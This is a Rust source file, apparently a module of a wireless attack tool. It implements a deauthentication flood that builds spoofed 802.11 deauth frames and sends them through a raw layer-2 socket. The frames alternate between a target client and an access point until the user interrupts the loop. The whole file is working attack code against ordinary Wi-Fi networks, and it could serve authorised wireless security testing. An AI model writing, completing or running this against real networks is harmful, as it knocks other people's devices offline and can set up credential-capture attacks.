use std::{thread, time::Duration};
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Arc;
use crate::engines::DeauthArgs;
use crate::pkt_builder::Frame802_11;
use crate::sockets::Layer2RawSocket;
use crate::utils::{ CtrlCHandler, inline_display };




pub struct Deauthentication {
    args:        DeauthArgs,
    builder:     Frame802_11,
    frames_sent: usize,
    socket:      Layer2RawSocket,

}


impl Deauthentication {

    pub fn new(args: DeauthArgs) -> Self {
        Self { 
            builder:     Frame802_11::new(),
            frames_sent: 0,
            socket:      Layer2RawSocket::new(&args.iface),
            args,
        }
    }



    pub fn execute(&mut self) {
        let running = Arc::new(AtomicBool::new(true));
        CtrlCHandler::setup(running.clone());

        while running.load(Ordering::SeqCst) {
            self.send_frame(self.args.target_mac, self.args.ap_mac,     0x0007);
            self.send_frame(self.args.ap_mac,     self.args.target_mac, 0x0003);
        }
        
        println!("\nFlood interrupted"); 
    }



    #[inline]
    fn send_frame(
        &mut self, 
        src_mac:     [u8; 6], 
        dst_mac:     [u8; 6], 
        reason_code: u16
    ) {
        let frame = self.builder.deauth(dst_mac, src_mac, self.args.bssid, reason_code);
        self.socket.send(frame);
        
        self.frames_sent += 1;
        inline_display(&format!("Frames sent: {}", &self.frames_sent));
        thread::sleep(Duration::from_millis(self.args.delay));
    }

}



impl crate::EngineTrait for Deauthentication {
    type Args = DeauthArgs;
    
    fn new(args: Self::Args) -> Self {
        Deauthentication::new(args)
    }
    
    fn execute(&mut self) {
        self.execute();
    }
}